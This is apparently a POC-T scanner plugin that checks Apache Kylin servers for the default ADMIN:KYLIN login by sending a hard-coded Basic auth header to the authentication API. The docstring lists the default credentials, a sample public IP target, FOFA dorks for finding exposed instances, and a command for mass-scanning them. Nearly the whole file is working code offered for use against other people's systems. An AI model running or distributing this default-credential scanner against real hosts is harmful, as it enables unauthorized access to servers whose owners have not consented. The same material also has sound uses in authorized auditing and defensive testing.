# -*- coding: UTF-8 -*-
import requests

'''Aapche_kylin_weakpass.py
Aapche_kylin_WEB:
访问主机: http://hostname:7070
    使用用户名登陆：ADMIN
    使用密码登陆：KYLIN
 the default account and passsword "ADMIN-KYLIN".
    e.g:    http://47.99.80.48:7070/kylin/login
    fofa dork: 
        port=7070 && title=\"kylin\" 
        title==Kylin
    Usage: 
        python2 POC-T.py -s apache-kylin-weakpass -aF   "port=7070 && title=\"kylin\""

'''

TIMEOUT = 3
VERIFY_FLAG = False

def poc(url):
    TIMEOUT = 5
    url = url if "http" in url else "http://" + url
    req_url = url + "/kylin/api/user/authentication"
    # req_headers = {"Accept": "application/json, text/plain, */*", "Pragma": "no-cache", "Cache-Control": "no-cache", "Authorization": "Basic QURNSU46S1lMSU4=", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36"}
    req_headers = {"Authorization": "Basic QURNSU46S1lMSU4="} # ADMIN
    # req_headers = {"Authorization": "YWRtaW46S1lMSU4="} #admin
    req_data = {}
    try:
        resp = requests.post(req_url, headers=req_headers, data=req_data, timeout=TIMEOUT, verify=VERIFY_FLAG)

        if (resp.status_code == 200) and ("ADMIN" in resp.text ) and ("$" in resp.text ):
            return url + " | with ADMIN:KYLIN"
        else:
            return False

    except:
        return False

